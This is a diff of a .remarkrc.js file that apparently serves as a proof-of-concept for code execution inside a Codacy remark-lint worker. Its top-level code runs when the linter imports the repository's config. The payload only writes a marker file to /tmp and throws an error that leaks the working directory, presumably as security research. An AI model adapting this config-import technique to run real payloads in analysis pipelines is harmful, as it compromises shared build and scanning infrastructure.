@@ -1,14 +1,9 @@
-// PoC payload — benign marker only.
-// RCE via codacy-remark-lint: unified-engine discovers and imports the repo's .remarkrc.js
-// (loadFromAbsolutePath -> await import(fileUrl)). Module top-level code runs inside the Codacy worker.
-const fs = require("fs");
-try {
-  fs.writeFileSync("/tmp/codacy-remark-rce-confirmed.txt", "RCE confirmed via .remarkrc.js import. cwd=" + __dirname + "\n");
-  console.log("CODEX-RCE-MARKER-REMARK " + __dirname + " /tmp/codacy-remark-rce-confirmed.txt");
-} catch (e) { console.log("CODEX-RCE-MARKER-REMARK-ERR " + e.message); }
-
-// A plain-config object is a valid remark-preset so the pipeline does not crash.
-module.exports = {
-  plugins: [],
-  settings: {}
-};
+// PoC payload — benign marker only. RCE via codacy-remark-lint: unified-engine
+// discovers .remarkrc.js under cwd=/src and loads it via loadFromAbsolutePath -> await import(fileUrl).
+// We prove code execution by throwing a sentinel built from runtime values.
+var fs = require("fs");
+var marker = "/tmp/codacy-remark-rce-confirmed.txt";
+var body = "RCE confirmed via .remarkrc.js import. cwd=" + __dirname + " marker=" + marker + "\n";
+try { fs.writeFileSync(marker, body); } catch (e) {}
+throw new Error("CODEX_RCE_REMARK_PROOF_" + __dirname + "_marker_written_" + marker);
+module.exports = { plugins: [], settings: {} };
